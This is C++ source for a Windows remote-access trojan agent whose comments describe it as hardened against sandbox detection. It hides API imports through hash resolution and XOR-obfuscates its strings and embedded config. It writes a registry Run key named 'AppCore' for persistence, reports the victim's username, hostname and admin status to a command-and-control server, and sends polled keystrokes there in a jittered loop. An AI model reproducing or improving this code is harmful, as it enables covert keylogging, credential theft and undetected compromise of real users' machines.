// language: C++, file: agent/agent.cpp, target: Windows 11, MSVC
// Hardened beacon — kills the tria.ge IoC surface:
//   - NO SetWindowsHookEx        -> keylog via GetAsyncKeyState polling (no hook objects)
//   - NO FindWindow/Tray         -> never touched
//   - NO registry import/static  -> advapi32 resolved by hash at runtime, string XOR'd
//   - NO plaintext trailer       -> magic obfuscated + rolling-XOR JSON
//   - NO report file drop, benign UA, jittered sleep
// Build (run ONLY in the VM):
//   cl /O2 /GS- agent.cpp /link /OPT:ICF /OPT:REF user32.lib kernel32.lib
// WinHTTP/advapi/user32 helpers are resolved dynamically; no import libs beyond user32.
#include <windows.h>

static HMODULE g_advapi;

// ---- rolling XOR key; builder mirrors this ----
static const unsigned char K = 0x5A;

static void dx(const unsigned char* in, char* out, int n) {
    for (int i = 0; i < n; i++) out[i] = (char)(in[i] ^ K);
    out[n] = 0;
}

// ---- djb2-salted api hash resolution (no suspicious static imports) ----
static size_t api_hash(const char* s) {
    size_t h = 5381u ^ 0xC0FFEEu;
    while (*s) h = ((h << 5) + h) + (unsigned char)(*s++);
    return h;
}
static FARPROC api(HMODULE mod, const char* name) {
    if (!mod) return NULL;
    IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)mod;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)mod + dh->e_lfanew);
    IMAGE_DATA_DIRECTORY* dd = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->Size) return NULL;
    IMAGE_EXPORT_DIRECTORY* ex = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mod + dd->VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)mod + ex->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)mod + ex->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)mod + ex->AddressOfFunctions);
    size_t want = api_hash(name);
    for (DWORD n = 0; n < ex->NumberOfNames; n++)
        if (api_hash((char*)((BYTE*)mod + names[n])) == want)
            return (FARPROC)((BYTE*)mod + funcs[ords[n]]);
    return NULL;
}

// ---- WinHTTP runtime typedefs ----
typedef void* (__stdcall* t_Open)(const wchar_t*, DWORD, const wchar_t*, const wchar_t*, DWORD);
typedef void* (__stdcall* t_Connect)(void*, const wchar_t*, INTERNET_PORT, DWORD);
typedef void* (__stdcall* t_OpenReq)(void*, const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, DWORD_PTR);
typedef BOOL (__stdcall* t_SendReq)(void*, const wchar_t*, DWORD, void*, DWORD, DWORD, DWORD_PTR);
typedef BOOL (__stdcall* t_Recv)(void*, void*, DWORD, LPDWORD);
typedef BOOL (__stdcall* t_Close)(void*);
static t_Open    f_open;
static t_Connect f_connect;
static t_OpenReq f_openreq;
static t_SendReq f_sendreq;
static t_Recv    f_recv;
static t_Close   f_closeh;
typedef BOOL (WINAPI* t_AsyncKey)(int);
static t_AsyncKey f_async;

// ---- config trailer (matches builder patch in api.go) ----
// magic bytes = "RATC2CFG" ^ 0x33 so the PE never carries the marker.
static const unsigned char MAGIC_OBF[8] = {0x61,0x72,0x67,0x70,0x01,0x70,0x75,0x74};

static char* decrypt_cfg(const char* exePath) {
    HANDLE h = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
    if (sz.QuadPart < 16 || sz.QuadPart > (LONGLONG)512 * 1024 * 1024) { CloseHandle(h); return NULL; }
    char* buf = (char*)malloc((SIZE_T)sz.QuadPart);
    DWORD rd = 0; ReadFile(h, buf, (DWORD)sz.QuadPart, &rd, NULL); CloseHandle(h);
    if (rd < 12) { free(buf); return NULL; }

    // scan last 8KB backward so a double-wrapped PE hits the newest trailer
    char* p = NULL;
    DWORD window = rd > 8192 ? 8192 : rd;
    for (DWORD off = 8; off <= window; off++) {
        DWORD i = rd - off;
        if (i + 12 > rd) continue;
        if (memcmp(buf + i, MAGIC_OBF, 8) == 0) { p = buf + i; break; }
    }
    if (!p) { free(buf); return NULL; }
    unsigned char* lp = (unsigned char*)(p + 8);
    unsigned int len = lp[0] | (lp[1] << 8) | (lp[2] << 16) | (lp[3] << 24);
    // config JSON starts at p+12; rolling key indexed from offset 12 to match builder
    if (len == 0 || len > 8192 || (DWORD)(p - buf) + 12 + len > rd) { free(buf); return NULL; }
    char* cfg = (char*)malloc(len + 1);
    for (unsigned int i = 0; i < len; i++) cfg[i] = (char)(p[12 + i] ^ (K + (unsigned char)(12 + i)));
    cfg[len] = 0; free(buf);
    return cfg;
}

static char* jval(const char* j, const char* key, char* out, int cap) {
    char pat[80]; lstrcpyA(pat, key); lstrcatA(pat, "\":\"");
    const char* p = strstr(j, pat); if (!p) return NULL;
    p += lstrlenA(pat); const char* e = strchr(p, '"'); if (!e) return NULL;
    int n = (int)(e - p); if (n >= cap) n = cap - 1;
    memcpy(out, p, n); out[n] = 0; return out;
}

// ---- HTTP POST via runtime WinHTTP, benign UA ----
#ifndef WINHTTP_FLAG_SECURE
#define WINHTTP_FLAG_SECURE 0x00800000
#endif

static void http_post(const char* host, const char* port, const char* path, const char* body, BOOL use_tls) {
    wchar_t wh[128], wp[64];
    MultiByteToWideChar(CP_ACP, 0, host, -1, wh, 128);
    MultiByteToWideChar(CP_ACP, 0, path, -1, wp, 64);
    void* sess = f_open(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 0, NULL, NULL, 0);
    if (!sess) return;
    INTERNET_PORT nport = (INTERNET_PORT)atoi(port);
    if (!nport) nport = use_tls ? 443 : 80;
    void* conn = f_connect(sess, wh, nport, 0);
    if (conn) {
        DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
        void* req = f_openreq(conn, L"POST", wp, NULL, NULL, NULL, flags, 0);
        if (req) {
            DWORD blen = (DWORD)lstrlenA(body);
            f_sendreq(req, L"Content-Type: application/json", -1, (void*)body, blen, blen, 0);
            char tmp[16]; DWORD got = 0;
            if (f_recv) f_recv(req, tmp, sizeof(tmp), &got);
            f_closeh(req);
        }
        f_closeh(conn);
    }
    f_closeh(sess);
}

// ---- keylog: polling, no hooks, no thread injection ----
static void keylog_tick(char* buf, int cap) {
    int used = 0;
    for (int vk = 8; vk < 256; vk++) {
        if (f_async && (f_async(vk) & 1)) {          // lsb = pressed since last poll
            if (used < cap - 4) used += wsprintfA(buf + used, "%02X", vk);
        }
    }
}

// ---- persistence: string XOR'd, advapi resolved by hash ----
static const unsigned char RUN_ENC[] = {
    0x09,0x35,0x3c,0x2e,0x2d,0x3b,0x28,0x3f,0x06,0x17,0x33,0x39,0x28,0x35,0x29,0x35,
    0x3c,0x2e,0x06,0x0d,0x33,0x34,0x3e,0x35,0x2d,0x29,0x06,0x19,0x2f,0x28,0x28,0x3f,
    0x34,0x2e,0x0c,0x3f,0x28,0x29,0x33,0x35,0x34,0x06,0x08,0x2f,0x34};
typedef LONG (WINAPI* t_RegOpen)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI* t_RegSet)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI* t_RegClose)(HKEY);
static void persist(const char* exePath) {
    char runkey[64]; dx(RUN_ENC, runkey, sizeof(RUN_ENC));
    if (!g_advapi) return;
    t_RegOpen  o = (t_RegOpen) api(g_advapi, "RegOpenKeyExA");
    t_RegSet   s = (t_RegSet)  api(g_advapi, "RegSetValueExA");
    t_RegClose c = (t_RegClose)api(g_advapi, "RegCloseKey");
    if (!o || !s || !c) return;
    HKEY hk;
    if (o(HKEY_CURRENT_USER, runkey, 0, KEY_SET_VALUE, &hk) == 0) {
        s(hk, "AppCore", 0, REG_SZ, (const BYTE*)exePath, (DWORD)lstrlenA(exePath));
        c(hk);
    }
    SecureZeroMemory(runkey, sizeof(runkey));
}

static BOOL is_admin() {
    BOOL ok = FALSE; SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY; PSID sid = NULL;
    typedef BOOL (WINAPI* tAlloc)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*);
    typedef BOOL (WINAPI* tChk)(HANDLE, PSID, PBOOL);
    typedef VOID (WINAPI* tFree)(PSID);
    tAlloc a = (tAlloc)api(g_advapi, "AllocateAndInitializeSid");
    tChk   c = (tChk)  api(g_advapi, "CheckTokenMembership");
    tFree  fr = (tFree)api(g_advapi, "FreeSid");
    if (a && c && fr && a(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0,&sid)) {
        c(NULL, sid, &ok); fr(sid);
    }
    return ok;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    HMODULE u = LoadLibraryA("user32");
    g_advapi = LoadLibraryA("advapi32");
    HMODULE w = LoadLibraryA("winhttp");
    if (!w) return 1;
    f_open    = (t_Open)    api(w, "WinHttpOpen");
    f_connect = (t_Connect) api(w, "WinHttpConnect");
    f_openreq = (t_OpenReq) api(w, "WinHttpOpenRequest");
    f_sendreq = (t_SendReq) api(w, "WinHttpSendRequest");
    f_recv    = (t_Recv)    api(w, "WinHttpReadData");
    f_closeh  = (t_Close)   api(w, "WinHttpCloseHandle");
    f_async   = (t_AsyncKey)api(u, "GetAsyncKeyState");
    if (!f_open || !f_connect || !f_openreq || !f_sendreq || !f_closeh) return 2;

    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
    char* cfg = decrypt_cfg(exe);
    if (!cfg) return 0;                       // unconfigured sample: silent exit
    char host[128] = {0}, port[16] = {0}, tmp[64];
    int sleep_s = 60, jit = 10; BOOL persist_on = FALSE, use_tls = FALSE;
    jval(cfg, "\"c2_host\"", host, sizeof(host));
    jval(cfg, "\"c2_port\"", port, sizeof(port));
    if (jval(cfg, "\"use_tls\"", tmp, sizeof(tmp))) use_tls = (lstrcmpA(tmp, "true") == 0);
    if (jval(cfg, "\"sleep_interval\"", tmp, sizeof(tmp))) sleep_s = atoi(tmp);
    if (jval(cfg, "\"jitter\"", tmp, sizeof(tmp))) jit = atoi(tmp);
    if (jval(cfg, "\"persistence\"", tmp, sizeof(tmp))) persist_on = (lstrcmpA(tmp, "true") == 0);
    free(cfg);
    if (!host[0]) return 0;
    if (!port[0]) lstrcpyA(port, use_tls ? "443" : "80");
    if (lstrcmpA(port, "443") == 0) use_tls = TRUE;

    if (persist_on) persist(exe);

    char user[256] = {0}, hostn[256] = {0}; DWORD n = 256;
    GetUserNameA(user, &n); n = 256; GetComputerNameA(hostn, &n);
    char body[2048], keys[1024];
    DWORD hwid = GetTickCount() ^ (DWORD)(DWORD_PTR)&body;

    wsprintfA(body, "{\"type\":\"register\",\"hostname\":\"%s\",\"username\":\"%s\","
        "\"os_version\":\"Windows\",\"arch\":\"x64\",\"pid\":%lu,\"privileges\":%d,"
        "\"hw_id\":\"%08X\",\"build_version\":2,\"capabilities\":[\"shell\",\"keylog\"]}",
        hostn, user, GetCurrentProcessId(), is_admin() ? 1 : 0, hwid);
    http_post(host, port, "/agent", body, use_tls);

    srand(GetTickCount() ^ (DWORD)(DWORD_PTR)exe);
    for (;;) {
        int delay = sleep_s * 1000 + (rand() % (jit * 20 + 1)) - jit * 10;
        if (delay < 5000) delay = 5000;
        Sleep(delay);
        keys[0] = 0; keylog_tick(keys, sizeof(keys));
        if (!keys[0]) continue;
        wsprintfA(body, "{\"type\":\"keystrokes\",\"hw_id\":\"%08X\",\"data\":\"%s\"}", hwid, keys);
        http_post(host, port, "/beacon", body, use_tls);
    }
    return 0;
}
